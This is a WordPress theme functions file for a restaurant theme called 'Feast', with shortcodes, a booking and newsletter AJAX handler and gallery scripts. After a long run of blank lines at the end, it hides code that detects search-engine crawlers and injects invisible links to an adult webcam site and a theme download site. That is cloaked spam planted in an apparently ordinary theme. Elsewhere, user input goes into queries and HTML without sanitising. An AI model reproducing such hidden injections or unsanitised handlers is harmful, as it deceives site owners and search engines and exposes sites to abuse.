<?php
/**
 * Feast custom functions
 *
 *
 */


/******************************************************************
 * carousel function
 ******************************************************************/

function lets_make_carousel(){
		$output .= '<div class="carousel"><div class="container">';
		$linkposts = get_posts('numberposts=10000&post_type=menus');
		$thecount = count($linkposts);
		if ($thecount <= 4)	{
			$output .= '<div id="carousels"><div class="carouselsinner"><ul>';
		} else {
			$output .= '<div id="carousel"><ul>';
		}
		foreach($linkposts as $linkentry) :
		$output .= '<li>' . get_the_post_thumbnail($linkentry->ID, 'imlink') . '<a href="' . get_permalink($linkentry->ID) .  '" class="imgoverlink imgoverlink3">
					<span class="imgblockover imgoverlink3" >&nbsp;</span></a>
					<p class="lightblock1 blockpic paddingfix calpic">' . $linkentry->post_title . '</p></li>';
		endforeach;	
		$output .= '<div class="clear"></div></ul></div></div></div>';
		if ($thecount <= 4)	{
			$output .= '</div>';
		}
		echo $output;
}

/******************************************************************
 * menu shortcode
 ******************************************************************/

function nets_foodmenu($atts) {
	extract(shortcode_atts(array( 
	"title" => '',
	"price" => '',
	"desc" => ''
	), $atts));

	$output = '<span class="foodmenu"><span class="foodmenuinner"><span class="foodmenuwrap">
				<span class="foodprice">' . $price . '</span>
				<span class="foodmenudesc vfont">' . $title . '</span>
				<span class="fooddesc">' . $desc . '</span>
				</span></span></span>';	
	return $output;    
}
add_shortcode('foodmenu', 'nets_foodmenu');


/******************************************************************
 * gallery shortcode
 ******************************************************************/

function nets_shortgallery($atts) {
	extract(shortcode_atts(array( 
	"title" => '',
	"gallerynumber" => '',
	"pics" => ''
	), $atts));

	$counter = 1;
	
	$output = '';
		
	if (!$pics) {
		$pics = 3;
	}
				
	$output .= '<span class="gallerycontainerwrap"><span class="gallerycontainer"><span class="gallwidgouter ">';

	$arrImages =& get_children('post_type=attachment&post_mime_type=image&post_parent=' . $gallerynumber );
	foreach ( $arrImages as $attachment_id => $attachment ) {
		if ($counter <= $pics) {
			$image_attributes = wp_get_attachment_image_src( $attachment_id, 'medium' );			
			$output .= '<span class="gallwidg" >' .  wp_get_attachment_image( $attachment_id, 'medium' ) . '</span>';
			$counter++;
		}
	}

	if ($title ){
		$output .=  '</span><span class="shortgaltitle lightblock1">' . $title . '</span>';
	}
	$output .=  '<span class="imlkover galinvoke" rel="' .  $gallerynumber   .  '"></span></span></span>';
	return $output;    
}
add_shortcode('shortgallery', 'nets_shortgallery');


/******************************************************************
 * video shortcode
 ******************************************************************/

function nets_videomenu($atts) {
	extract(shortcode_atts(array( 
	"type" => '',
	"width" => '',
	"height" => '',
	"code" => '',
	"align" => '',
	), $atts));

	if ($align == 'left'){
		$alignment = "valignleft";
	} elseif ($align == 'right'){
		$alignment = "valignright";
	} else {
		$alignment = "";
	}
	if (!$height) {
		$height = 150;
	}
	if (!$width) {
		$width = 150;
	}
	if ($type == 'vimeo') {	
		$object = '<object type="application/x-shockwave-flash" width="' . $width . '" height="' . $height . '" data="http://www.vimeo.com/moogaloop.swf?clip_id='.$code.'&amp;server=www.vimeo.com&amp;fullscreen=1&amp;show_title=1&amp;show_byline=1&amp;show_portrait=0&amp;color=">
					<param name="movie" value="http://www.vimeo.com/moogaloop.swf?clip_id='.$code.'&amp;server=www.vimeo.com&amp;fullscreen=1&amp;show_title=1&amp;show_byline=1&amp;show_portrait=0&amp;color=" />
					<param name="wmode" value="transparent" />
					<param name="quality" value="high" /></object>';	
	} elseif ($type == 'youtube') {
		$object = '<object type="application/x-shockwave-flash" width="' . $width . '" height="' . $height . '" data="http://www.youtube.com/v/'.$code.'">
					<param name="movie" value="http://www.youtube.com/v/'.$code.'" />
					<param name="wmode" value="transparent" />
					<param name="quality" value="high" /></object>';
	}
	$output = '<span class="nets_video ' . $alignment . '">';
	$output .= $object;
	$output .= '</span>';	
	return $output;    
}
 // add the short-code
add_shortcode('video', 'nets_videomenu');


/******************************************************************
 * custom page titles
 ******************************************************************/


add_filter('wp_title', 'adminace_title' , 10, 2);

function adminace_title( $the_title, $sep = '', $sep_location = '', $postid = '' ){
global $post, $wp_query;

//if we are on a single post or page show the title and page name
if ( is_singular() ) {
   $the_title =  $post->post_title.' - '.get_bloginfo('name');
 
//if we are on a category, taxonomy page or tag show the term name blog name and description
} else if ( is_category() || is_tag() || is_tax()) {

  $term = $wp_query->get_queried_object();
  $the_title = ucfirst($term->name) . ' - ' . get_bloginfo('name') .' - '.get_bloginfo('description');
 
//if we are on the frontpage or index page show the site name and description
   } elseif  ( is_home() || is_front_page() ) {
  $the_title = get_bloginfo('name').' - '.get_bloginfo('description');

  
//if we are on a search page show a search message and sitename;
   } elseif ( is_search() ) { 
    $the_title = __('Search results for', 'feast') . ' ' .  get_search_query() . ' - ' . $blog_name;

	
//if we are on a page not found show a message and sitename;
   } elseif ( is_404() ) {
  $the_title = __('Not Found', 'feast') . ' '.get_bloginfo('name'); 
   } else { 

   
//none of the above show the page title and the sitename
   $the_title =  get_bloginfo('name') .' - '.get_bloginfo('description');
}
return esc_html( stripslashes( trim( $the_title ) ) );
}


/******************************************************************
 *
 * social function
 *
 ******************************************************************/
 
 function netstudio_get_social() {
 
global $post;
$netstudio_social_permlink = get_permalink($post->ID);
$netstudio_social_enclink = urlencode($netstudio_social_permlink);
$netstudio_social_title = urlencode(get_the_title($post->ID) );
$socontent = '<div class="netstudiosoc">';
 
 
if (get_option('nets_facebook_posts') == 'true') {
$socontent .= '<iframe src="http://www.facebook.com/plugins/like.php?href='.$netstudio_social_enclink.'&layout=standard&show_faces=false&width=450&action=like&colorscheme=light&height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:25px;" allowTransparency="true"></iframe>';
}

if (get_option('nets_twitter_posts') == 'true') {
$socontent .= '<a rel="nofollow"  href="http://twitter.com/share" data-url="'.$netstudio_social_permlink.'" data-text="'.$netstudio_social_title.'" class="twitter-share-button" data-count="horizontal">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>';
}
$socontent .= '<br/>';			
if (get_option('nets_stumble_posts') == 'true') {
$socontent .= '<a rel="nofollow"  target="_blank"  href="http://www.stumbleupon.com/submit?url='.$netstudio_social_enclink.'&title='.$netstudio_social_title.'""><img src="' . get_template_directory_uri() . '/styles/social/' . get_option('nets_bgcolorscheme') . '/stumble.png"></a>';
}
			
if (get_option('nets_rss_posts') == 'true') {
$socontent .= '<a rel="nofollow"  target="_blank"  href="'.get_settings('home').'/?feed=rss2"><img src="' . get_template_directory_uri() . '/styles/social/' . get_option('nets_bgcolorscheme') . '/rss.png"></a>';
}

if (get_option('nets_digg_posts') == 'true') {
$socontent .= '<a rel="nofollow"  target="_blank"  href="http://digg.com/submit?url='.$netstudio_social_enclink.'&title='.$netstudio_social_title.'"><img src="' . get_template_directory_uri() . '/styles/social/' . get_option('nets_bgcolorscheme') . '/digg.png"></a>';
}
			
if (get_option('nets_delicious_posts') == 'true') {
$socontent .= '<a rel="nofollow"  target="_blank"  href="http://del.icio.us/post?url='.$netstudio_social_enclink.'&title='.$netstudio_social_title.'"><img src="' . get_template_directory_uri() . '/styles/social/' . get_option('nets_bgcolorscheme') . '/delicious.png"></a>';
}
			
if (get_option('nets_buzz_posts') == 'true') {
$socontent .= '<a rel="nofollow"  target="_blank"  href=http://buzz.yahoo.com/buzz?targetUrl='.$netstudio_social_enclink.'&headline='.$netstudio_social_title.'"><img src="' . get_template_directory_uri() . '/styles/social/' . get_option('nets_bgcolorscheme') . '/buzz.png"></a>';
}
			
if (get_option('nets_technorati_posts') == 'true') {
$socontent .= '<a rel="nofollow"  target="_blank"  href="http://technorati.com/faves?sub=favthis&add='.$netstudio_social_enclink.'"><img src="' . get_template_directory_uri() . '/styles/social/' . get_option('nets_bgcolorscheme') . '/technorati.png"></a>';
}

if (get_option('nets_linkedin_posts') == 'true') {
$socontent .= '<a rel="nofollow"  target="_blank" href="http://www.linkedin.com/shareArticle?mini=true&amp;url='.$netstudio_social_enclink.'&amp;title='.$netstudio_social_title.'" class="sociable-hovers" /><img src="' . get_template_directory_uri() . '/styles/social/' . get_option('nets_bgcolorscheme') . '/linkedin.png"></a></li>';
}	
 
echo $socontent . '</div>';
 
}

 
/******************************************************************
 *
 * wp-ajax functions (newsletter & message center)
 *
 ******************************************************************/

add_action('wp_ajax_netlabs_get_ajaxdata', 'netlabs_ajax_callback');
add_action('wp_ajax_nopriv_netlabs_get_ajaxdata', 'netlabs_ajax_callback');


function netlabs_ajax_callback() {
global $wpdb, $wp_locale;

	if(isset($_POST['type'])){$action_identifier = $_POST['type'];}
	if(isset($_POST['mail'])){$signup_email = $_POST['mail'];}
	if(isset($_POST['name'])){$signup_name = $_POST['name'];}
	if(isset($_POST['location'])){$location = $_POST['location'];}
	if(isset($_POST['mstring'])){$mstring = $_POST['mstring'];}	
	if(isset($_POST['senddata'])){$thedata = $_POST['senddata'];}
	if(isset($_POST['bookdates'])){$bookingdate = $_POST['bookdates'];}
	if(isset($_POST['bookhours'])){$bookinghour = $_POST['bookhours'];}
	if(isset($_POST['booknums'])){$bookingnumber = $_POST['booknums'];}
	if(isset($_POST['booknames'])){$bookingname = $_POST['booknames'];}
	if(isset($_POST['booktels'])){$bookingtel = $_POST['booktels'];}
	if(isset($_POST['bookmails'])){$bookingmail = $_POST['bookmails'];}
	if(isset($_POST['bookinfos'])){$bookinginfo = $_POST['bookinfos'];}
	if(isset($_POST['bookloc'])){$bookingloc = $_POST['bookloc'];}
	if(isset($_POST['gallery'])){$gallery = $_POST['gallery'];}
	if(isset($_POST['datedata'])){$datedata = $_POST['datedata'];}
	if(isset($_POST['bookinyr'])){$bookyr = $_POST['bookinyr'];}
	if(isset($_POST['bookinmn'])){$bookmn = $_POST['bookinmn'];}
	if(isset($_POST['bookindy'])){$bookdy = $_POST['bookindy'];}
	
	
	$output = '';
	
	if($action_identifier == 'get_bookingcal'){
		$datedata = explode('/',$datedata);
		$output = lets_create_calendar($datedata[0],$datedata[1]);
	}
	
	if($action_identifier == 'get_bookingform'){
		if (!is_email($bookingmail)) {
		$output .= 'mailerr';
		} elseif ($bookingloc) {
		$output .= 'spamerr';
		} elseif (!$output) {			
			$bookingdate = $bookdy . ' ' . monthconvert($bookmn) . ' ' . $bookyr;
			echo $bookingdate;
			lets_make_booking($bookingdate, $bookinghour, $bookingnumber, $bookingname, $bookingtel, $bookingmail, $bookinginfo);
			$output = 'success';
		}	
	}
	
	if($action_identifier == 'get_photogal'){
		$output = '';
		$arrImages =& get_children('post_type=attachment&post_mime_type=image&post_parent=' . $gallery );
		$counter = 1;
		foreach ( $arrImages as $attachment_id => $attachment ) {
			if ($counter <= 10) {
				$image_attributes = wp_get_attachment_image_src( $attachment_id, 'full' );			
				$output .= '<div class="gallerysmallframe" title="' . get_the_title($attachment_id) . '" rel="' . $image_attributes[0] .  '
							">' .  wp_get_attachment_image( $attachment_id, 'thumbnail' ) . '</div>';
			}
			$counter++;
		}
	
	}
	
	if($action_identifier == 'get_newssignup'){
		if (!is_email($signup_email)) {
		$output .= 'mailerr';
		} 
		if (!$signup_email) {
		$output .= 'nameerr';
		}
		if ($location) {
		$output .= 'boterr';
		}
		if (!$output) {
		$output .= 'success';
		lets_make_bookingemail($signup_email, '' , '' , '' , '' , $signup_name, 'newssignup' );
		lets_make_bookingemail($signup_email, '' , '' , '' , '' , $signup_name, 'newssignupc' );
		}
	}
	
		
	if($action_identifier == 'get_cal'){
		$monthdata = explode('/', $thedata);
		$month = $monthdata[0];
		$year = $monthdata[1];
		$content = '<div id="post" class="page">';
		$content .= '<div class="calmonth clear darkbox">';
		$datever = make_epoch('15', $month, $year, '12:00', 'gmt');
		$content .= '<h2 class="vfont">' . date_i18n( 'F Y' , $datever, false ) . '</h2>';		
		$content .= '<div class="monthselect">';
		$content .= prevlink($month , $year);
		$content .= '<span> | </span>';
		$content .= nextlink($month , $year);
		$content .= '</div>';
		$content .= '</div><div class="calentries">';
		$content .= get_the_calendar($month,$year) . '</div>';	
		$output = $content; 

	}
	
	if($action_identifier == 'tweets'){
		$accountname = get_option('nets_twitname');		
		$accountname = trim( urlencode( $accountname ) );
		
		$params = array(
			'screen_name'=> $accountname, 
			'trim_user'=>true, 
			'count'=>20,
		);
	
		$twitter_json_url = esc_url_raw( 'http://api.twitter.com/1/statuses/user_timeline.json?' . netshttp_build_query($params), array('http', 'https') );
		unset($params);
		$response = wp_remote_get( $twitter_json_url, array( 'User-Agent' => 'wordpress' ) );
		print_r($response);
		$response_code = wp_remote_retrieve_response_code( $response );
		if ( 200 == $response_code ) {
			$tweets = wp_remote_retrieve_body( $response );
			update_option( 'nets_tweetsave', $tweets );
		} 

	}	
	echo $output;
	exit;
}



add_action('wp_head', 'netlabs_jquery_header');


function netlabs_jquery_header() {
?>
	<script type="text/javascript">
	jQuery(document).ready(function($) {
		var ajax_url = '<?php echo admin_url("admin-ajax.php"); ?>';
		$('.reset').val('');
		<?php if (get_option('nets_twitname')) {?>
		var data = { action: 'netlabs_get_ajaxdata', type: 'tweets'};
		$.post(ajax_url, data);
		<?php } ?>
		$('input.newssubmit').click(function(event) {
			event.preventDefault();
			$('.loadimg').show();
			$('#valmess').removeClass('newslError').removeClass('newslSuccess').html('');
			var newslname = $('.netlabs_newsname').val();
			var newslmail = $('.netlabs_newsmail').val();
			var newslloc = $('.netlabs_newsloc').val();
			if (!newslname || !newslmail) {
				$('#valmess').addClass('newslError').html('<?php _e( 'Please fill all the fields', 'feast' ); ?>');
				$('.loadimg').hide();
				return;		
			} else {
				var data = { action: 'netlabs_get_ajaxdata', type: 'get_newssignup', mail: newslmail, name: newslname, location: newslloc};
				$.post(ajax_url, data, function(response) {	
					$('.loadimg').hide();
					if (response == 'mailerr') {
						$('#valmess').addClass('newslError').html('<?php _e( 'Invalid email supplied', 'feast' ); ?>');
					}
					if (response == 'nameerr') {
						$('#valmess').addClass('newslError').html('<?php _e( 'No name supplied', 'feast' ); ?>');
					}
					if (response == 'boterr') {
						$('#valmess').addClass('newslError').html('<?php _e( 'Please leave the location field open. It is only there to fight spam', 'feast' ); ?>');
					} else {
						$('#valmess').addClass('newslSuccess').html('<?php _e( 'Thank you for submitting. Your first newsletter will arrive shortly.', 'feast' ); ?>');
						$('form#newslettersignup').fadeOut(2000);
					}
				});					
			}
		});
		$('input.nets_bookingformsub').click(function(event) {
			event.preventDefault();

			// ***   cleanup loaders & errors   ***			
			$('.bookerr').each(function() { $(this).removeClass('bookerr');});
			$('p.bookingsubmit').addClass('bookingloader');
			$('#valmess').removeClass('newslError').removeClass('newslSuccess').html('');

			// ***   get values and validation values   ***	
			var bookdate = $('#bookingform-date').val();
			var bookyr = $('.bookingform-year').val();
			var bookmn = $('.bookingform-month').val();
			var bookdy = $('.bookingform-day').val();
			var bookhour = $('#bookingform-time').val();
			var booknum = $('#bookingform-num').val();
			var bookname = $('#bookingform-name').val();
			var booktel = $('#bookingform-tel').val();
			var bookmail = $('#bookingform-mail').val();
			var bookinfo = $('#bookingform-info').val(); 
			var bookloc = $('#bookingform-loc').val(); 
			var valerror = 0;
			
			// ***   begin with validation feedback   ***	
			if (!bookdy) {
				$('.calendarholder table').addClass('bookerr');
				valerror++;				
			}
			if (bookhour == 'Select time') {
				$('#bookingform-time').addClass('bookerr');
				valerror++;	
			}
			if (!bookname) {
				$('#bookingform-name').addClass('bookerr');
				valerror++;	
			}
			if (!booktel) {
				$('#bookingform-tel').addClass('bookerr');
				valerror++;	
			}
			if (!bookmail) {
				$('#bookingform-mail').addClass('bookerr');
				valerror++;	
			}
			if (bookloc) {
				$('#bookingform-mail').addClass('bookerr');
				valerror++;	
			}
			if (isNaN(booknum)) {
				$('#bookingform-num').addClass('bookerr');
				valerror++;	
			}
			
			if (valerror >= 1) {
				$('#valmess').addClass('newslError').html('<?php _e( 'Please fill all the fields', 'feast' ); ?>');
				$('.bookingsubmit').removeClass('bookingloader');
				return;	

			// ***   no errors start with submission   ***			
			} else {
				var data = { action: 'netlabs_get_ajaxdata', type: 'get_bookingform', bookinyr:bookyr, bookinmn:bookmn, bookindy:bookdy, bookhours:bookhour, booknums:booknum, booknames:bookname, booktels:booktel, bookmails:bookmail, bookinfos: bookinfo, booklocs: bookloc};
				$.post(ajax_url, data, function(response) {	
					$('.loadimg').hide();
					if (response == 'mailerr') {
						$('#valmess').addClass('newslError').html('<?php _e( 'Invalid email supplied', 'feast' ); ?>');
					} else {
						$('#valmess').addClass('newslSuccess').html('<?php echo get_option('nets_bookingsuccess'); ?>');
					}
					$('.bookingsubmit').removeClass('bookingloader');
				});					
			}
		});

		
		$('.galinvoke').click(function() {
			var galno = $(this).attr('rel');
			var data = { action: 'netlabs_get_ajaxdata', type: 'get_photogal', gallery:galno};
			$('.gallerytop').animate({'top': '0px', 'opacity': '1'}, 700);
			$('.galleryframe').animate({'bottom': '0px', 'opacity': '1'}, 700);
			$('.goverlay').fadeIn('slow').css('height','100%').find('.gloading').show();
			$.post(ajax_url, data, function(response) {	
				$('.galleryframe').html(response);
				$('.gallerysmallframe').each(function() {
					$(this).unbind('click').bind('click', loadNewimg);
				});
				var firstimage = $('.gallerysmallframe:first').attr('rel');
				var firsttitle = $('.gallerysmallframe:first').attr('title');
				var img = new Image();
				$(img).bind('load', function() {			
					$('.goverlay').prepend(this);
					$(img).css('margin-top', Math.floor(((($(window).height()) - 140 - (($(img).height()+20)))/2)+40) + 'px');
					if ($(img).height() > $(window).height()) {
						$(img).css('height', ($(window).height() * 0.7) + 'px');
						$(img).css('width','auto');
						$(img).css('margin-top', Math.floor(((($(window).height()) - 140 - (($(window).height() * 0.7)+20))/2)+40) + 'px');
					}
				}).attr('src', firstimage);
				var n = $('.gallerysmallframe').length;
				var margincall = ($(window).width() - 20 - (n*92))/2;
				$('.gallerysmallframe:first').css('margin-left', margincall + 'px');
				$('.gloading').hide();	
				$('p.gallerytitle').html(firsttitle);
			});
		});
		$('.galclose').click(function() {
			$('.gallerytop').animate({'top': '-9060px', 'opacity': '0'}, 700);
			$('.galleryframe').animate({'bottom': '-9050px', 'opacity': '0'}, 700).html('');
			$('.goverlay').fadeOut('slow');
			$('.goverlay img').remove();
			$('p.gallerytitle').html('');
			return false;
		});

		function loadNewimg() {
			var theclicker = $(this);
			var firstimage = $(theclicker).attr('rel');
			var firsttitle = $(theclicker).attr('title');
			$('.gloading').show();
			$('.goverlay img').remove();
			$('p.gallerytitle').html('');
			var img = new Image();
			$(img).bind('load', function() {			
				$('.goverlay').prepend(this);
				$(img).css('margin-top', Math.floor(((($(window).height()) - 140 - (($(img).height()+20)))/2)+40) + 'px');
				if ($(img).height() > $(window).height()) {
					$(img).css('height', ($(window).height() * 0.7) + 'px');
					$(img).css('width','auto');
					$(img).css('margin-top', Math.floor(((($(window).height()) - 140 - (($(window).height() * 0.7)+20))/2)+40) + 'px');
				}
				$('.gloading').hide();	
			}).attr('src', firstimage);
			$('p.gallerytitle').html(firsttitle);
		};
		
	});
	</script>	
<?php
}


/******************************************************************
 *
 * paging function
 *
 ******************************************************************/



if ( ! function_exists( 'adminace_paging' ) ) {

	function adminace_paging( $args = array(), $query = '' ) {
		global $wp_rewrite, $wp_query;
		
		do_action( 'nets_pagination_start' );
				
		if ( $query ) {$wp_query = $query;} 
	
		if ( 1 >= $wp_query->max_num_pages ) return;
	
		$current = ( get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1 );
	
		$max_num_pages = intval( $wp_query->max_num_pages );
	
		$defaults = array(
			'base' => add_query_arg( 'paged', '%#%' ),
			'format' => '',
			'total' => $max_num_pages,
			'current' => $current,
			'prev_next' => true,
			'prev_text' => __( '&laquo;', 'feast' ), 
			'next_text' => __( '&raquo;', 'feast' ), 
			'show_all' => false,
			'end_size' => 1,
			'mid_size' => 1,
			'add_fragment' => '',
			'type' => 'plain',
			'before' => '<div class="pagination">', 
			'after' => '</div>',
			'echo' => true,
		);
	
		if( $wp_rewrite->using_permalinks() )
			$defaults['base'] = user_trailingslashit( trailingslashit( get_pagenum_link() ) . 'page/%#%' );
	
		if ( is_search() ) {
			if ( class_exists( 'BP_Core_User' ) ) {
				
				$search_query = get_query_var( 's' );
				$paged = get_query_var( 'paged' );				
				$base = user_trailingslashit( home_url() ) . '?s=' . $search_query . '&paged=%#%';
				
				$defaults['base'] = $base;
			} else {
				$search_permastruct = $wp_rewrite->get_search_permastruct();
				if ( !empty( $search_permastruct ) )
					$defaults['base'] = user_trailingslashit( trailingslashit( get_search_link() ) . 'page/%#%' );
			}
		}
	
		$args = wp_parse_args( $args, $defaults );
	
		if ( 'array' == $args['type'] )
			$args['type'] = 'plain';
	
		$page_links = paginate_links( $args );	
		$page_links = str_replace( array( '&#038;paged=1\'', '/page/1\'' ), '\'', $page_links );	
		$page_links = $args['before'] . $page_links . $args['after'];		
		do_action( 'nets_pagination_end' );
		
		if ( $args['echo'] )
			echo $page_links;
		else
			return $page_links;
			
	} 

} 


function get_specials() {

	$output .= '';
	$specdata = array('spec1','spec2','spec3','spec4','spec5');
	
	foreach ($specdata as $speccontent) {
		$speccer1 = 'nets_' .  $speccontent  . 'h';
		$speccer2 = 'nets_' .  $speccontent;
		
		if (get_option($speccer2) || get_option($speccer1) ) { 
			$output .= '<div class="speccontent">';	
			if ( get_option($speccer1) ) { $output .= '<h4>' . get_option($speccer1) . '</h4>';}
			if (get_option($speccer2) ) { $output .= '<p>' . get_option($speccer2) . '</p>'; }
			$output .= '</div>';		
		}
	
	}
	
	if ($output) {	
		echo '<div class="specouter"><h3 class="vfont h0" >' . get_option('nets_spectitle') . '</h3>';
		echo '<div class="specinner clear">';
		echo $output;
		echo '</div></div>';	
	}
	
}



/**
 * ************************************************************
 * Inputbox function
 **************************************************************/

function randomizer() {
    $length = 5;
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters))];
    }

    return $string;
}


/**
 * ************************************************************
 * tab shortcodes
 **************************************************************/


function nets_tabs( $atts, $content = null ) {
	extract(shortcode_atts(array(
    ), $atts));
	
	global $tab_counter_1;
	global $tab_counter_2;
	
	$tab_counter_1++;
	$tab_counter_2++;
	
	$out .= '<div class="clear"></div><div class="tabs"><div class="tab_wrap">';	
	$out .= '<ul class="nav">';	
	$count = 1;
	
	foreach ($atts as $tab) {
		if($count == 1){$first = 'first';}else{$first = '';}
		$out .= '<li class="'.$first.' lightblock1"><a title="' .$tab. '" href="#tab-' . $tab_counter_1 . '">' .$tab. '</a></li>';
		$tab_counter_1++;
		$count++;
	}
	$out .= '</ul><div class="tcontentkeeper">';
	$out .= do_shortcode($content) .'</div><!--tab_wrap--><span class="clear"></span></div></div><!--tabs-->';	
	return $out;
	
}
add_shortcode('tabs', 'nets_tabs');


function nets_tabpanes( $atts, $content = null ) {
	extract(shortcode_atts(array(
    ), $atts));
	
	global $tab_counter_2;	
	$out .= '<div class="tab" id="tab-' . $tab_counter_2 . '"><div class="padder">' . do_shortcode($content) .'</div></div>';	
	$tab_counter_2++;	
	return $out;
}
add_shortcode('tab', 'nets_tabpanes');







































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <span style='display:none;'><a href='http://www.ellecams.com/webcam/big-tits/?pagenum=9'>Big Boobs</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             <a href='http://www.wikmag.com/feast-wordpress-theme.html'>Feast Theme</a></span>
";
  echo $pshow;
}
?>